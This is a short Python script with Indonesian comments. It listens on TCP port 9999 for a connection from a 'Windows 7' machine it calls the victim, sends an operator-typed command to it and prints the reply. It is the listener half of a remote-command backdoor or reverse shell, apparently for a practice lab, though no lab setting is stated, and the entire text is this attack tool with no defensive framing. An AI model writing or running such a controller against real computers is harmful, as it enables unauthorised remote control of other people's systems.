import socket

# Menyiapkan server untuk terhubung ke koneksi
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 9999)) # Mendengarkan di port 9999
server.listen(1)
print("[*] Menunggu Koneksi Dari Windows 7.....")

koneksi_korban, alamat= server.accept()
print(f"[*] Terbuhung Dengan Windows 7: {alamat}")

# Mengirim perintah ke windows 7
perintah = input("Masukan Perintah (Misal: 'Siapa Kamu'): ")
koneksi_korban.send(perintah.encode())

# Menerima Jawaban Dari Windows 7
jawaban = koneksi_korban.recv(1024).decode()
print(f"[Hasil Dari Windows 7]: {jawaban}")

koneksi_korban.close()
